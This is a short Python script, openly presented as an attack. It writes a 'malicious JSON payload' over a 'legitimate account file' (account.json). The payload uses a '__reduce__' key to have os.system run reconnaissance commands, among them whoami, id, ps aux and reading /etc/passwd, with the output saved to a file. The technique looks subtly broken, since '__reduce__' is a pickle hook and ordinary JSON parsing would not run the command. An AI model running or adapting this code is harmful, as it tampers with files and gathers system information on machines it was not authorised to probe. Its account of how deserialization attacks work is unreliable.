import json
import os

# Craft a malicious JSON payload
malicious_payload = {
    "__reduce__": ["os.system", "(set -x; whoami; id; uname -a; ps aux; cat /etc/passwd) > Secure_output.txt 2>&1 &"]
}

# Convert to JSON format
json_payload = json.dumps(malicious_payload).encode()

# Overwrite the legitimate account file with the malicious JSON payload
with open("account.json", "wb") as f:
    f.write(json_payload)

print("Malicious payload injected.")

